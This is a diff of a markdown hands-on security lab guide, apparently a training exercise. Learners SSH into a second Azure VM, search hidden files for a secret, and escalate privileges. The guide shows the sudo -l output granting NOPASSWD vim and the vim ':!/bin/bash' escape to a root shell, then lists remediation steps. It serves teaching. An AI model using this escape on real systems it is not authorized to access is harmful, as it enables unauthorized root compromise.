@@ -140,55 +140,122 @@ ssh -i path/to/key azureuser@<Internal_IP>
 
 ## Step 6: Explore the Second VM
 
-🎉 You're in! Time to explore this second VM:
+You're in! Time to explore this second VM:
 
 ### 6.1: Basic System Information
+
+Check current user and privileges
 ```bash
-# Check current user and privileges
 whoami
 id
+```
 
-# Check system information
+Check system information
+```bash
 uname -a
 cat /etc/os-release
 ```
 
 ### 6.2: Look for Sensitive Files
-```bash
-# Search for interesting files in common locations
-find /home -type f -name "*.txt" -o -name "*.log" -o -name "*.conf" 2>/dev/null
-ls -la ~/
 
-# Look for hidden files and directories
-ls -la /tmp/
-find . -name ".*" -type f 2>/dev/null
+You might find some interesting files in the home directory or other locations. Spend a few minutes exploring the file system to see if you can find any sensitive files or directories that might contain the secret! 
+
+Here are some helpful commands for exploring:
+
+```bash
+# List files in the current directory
+ls
+
+# Change directory
+cd <directory_name>
+
+# Read a file
+cat <file_name>
+
+# List all directories and files in a tree structure
+tree
 ```
 
-### 6.3: Check for Privilege Escalation Opportunities
+### 6.3: Find Hidden Files
+
+The regular `ls` and `tree` commands might not show everything. 
+
+Try:
+
 ```bash
-# Check sudo privileges (most important!)
+# List files in the current directory, including hidden files
+ls -a
+
+# List all directories and files in a tree structure, including hidden files
+tree -a
+```
+
+Now you should see some hidden files scattered around! Keep exploring with `ls`, `cd`, and `cat` until you find what looks like the real secret.
+
+> [!TIP]
+> **Hidden Files**: Files starting with a dot (.) are hidden by default. The `-a` flag reveals them!
+
+### 6.4: Navigate to the Secret
+
+Try to `cat` the file you think contains the secret. You will be faced with a "Permission denied" error, indicating that the file is protected and you don't have permission to read it as the current user.
+
+## Step 7: Privilege Escalation
+### 7.1: Check for Privilege Escalation Opportunities
+
+You might be able to escalate your privileges using `sudo`. First, check if you have any sudo privileges:
+
+```bash
 sudo -l
 ```
 
-> [!TIP]
-> **Common Privilege Escalation**: If `sudo -l` shows you can run commands as root without a password, you might be able to escalate privileges.
+>[!NOTE]
+**-l:** Lists the allowed (and forbidden) commands for the current user.
 
-> [!WARNING]
-> **Vim Privilege Escalation**: If you can run `vim` with sudo, you can escape to a root shell! Try:
-> ```bash
-> sudo vim /etc/passwd
-> # Then in vim, type: :!/bin/bash
-> # This gives you a root shell!
-> ```
+You should see:
+
+```text
+User azureuser may run the following commands on MrMoneyBagsVM:
+    (ALL) NOPASSWD: /usr/bin/vim
+```
+
+This means that you can run `vim` as root without needing to enter a password. This is a common misconfiguration that can lead to privilege escalation.
+
+### 7.2: Use Vim for Privilege Escalation
+
+There are two main ways to use `vim` for privilege escalation:
+1. **Read the file directly**: 
+    
+    This way is simple and straightforward. You can open the secret file with `vim` and read its contents.
+
+    ```bash
+    sudo vim /path/to/the/secret/file
+    ```
+
+1. **Escape to a root shell**:
+    
+    This way is a bit more involved but much more **powerful**. You can use `vim` to get a root shell and then read the file.
+
+    ```bash
+    sudo vim
+    ```
+
+    Once inside `vim`, type the following command to escape to a root shell:
+
+    ```vim
+    :!/bin/bash
+    ```
+
+    This will give you a root shell where you will have full access to the system and can read any file, including the secret one!
+
+## Step 8: You did it! 🎉
+Congratulations! 
+
+You have successfully compromised the VM, navigated the network, and escalated your privileges to read the secret file. Take a moment to reflect on what you learned about common security misconfigurations and how they can be exploited. 
+
+Optionally, you can now try to secure the VM by applying any remediation steps below.
 
 
-🎉 You’re in! Time to explore this second VM:
-
-- Look for sensitive files.
-- Check permissions or configurations for vulnerabilities.
-- Use tools like sudo -l to see if privilege escalation is possible.
-
-## Remediation (Optional...but only for this lab, not irl)
+## Remediation
 
 After completing the exercise, feel free to use the vulnerabilities you learned about to secure the vms.
 
@@ -205,6 +272,7 @@ Suggestions for improved security include:
 
 3. **Restrict Network Access:**
     - Update NSG rules to allow SSH only from specific trusted IPs.
+    - Change the default SSH port from 22 to a non-standard port.
     - Remove any broad rules like Allow Any or unrestricted inbound access.
 
 4. **Connect via Bastion:**
@@ -213,7 +281,3 @@ Suggestions for improved security include:
 5. **Monitor and Audit Logs:**
     - Enable logging for SSH access and network activities.
     - Use Azure Monitor and Security Center to detect unusual login attempts.
-
-6. **Harden the VM:**
-    - Apply least privilege principles.
-    - Regularly update and patch the VM.
